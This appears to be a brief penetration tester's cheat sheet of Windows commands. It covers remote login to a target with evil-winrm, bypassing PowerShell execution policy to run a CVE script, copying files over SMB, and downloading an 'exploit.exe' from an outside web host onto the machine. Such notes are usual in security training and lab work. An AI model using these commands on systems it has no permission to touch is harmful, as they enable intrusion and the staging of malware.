-- winrm --
evil-winrm --ip targetip --user khirou --password khirou

-- powershell version --
$PSVersionTable.PSVersion
(Get-Host).Version 


-- chaning execution policy ps --
get-executionpolicy // get the current policy 
powershell -ExecutionPolicy ByPass -File "C:/Users/khirou/Documents/CVE.ps1"
Set-ExecutionPolicy RemoteSigned || Set-ExecutionPolicy Unrestricted 
set-ExecutionPolicy RemoteSigned -Scope CurrentUser // for the current user not all users


-- copy files using smb --
Copy-Item -Source \\192.168.1.1\share\file -Destination C:\path\file.exe


-- download files using http powershell3 --
Invoke-WebRequest -Uri "http://www.khirou.com/exploit.exe" -OutFile "C:\path\exploit.exe"
wget "http://www.contoso.com" -outfile "file"


-- download files using http/ftp powershell2 --
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://www.contoso.com/file","C:\path\file")

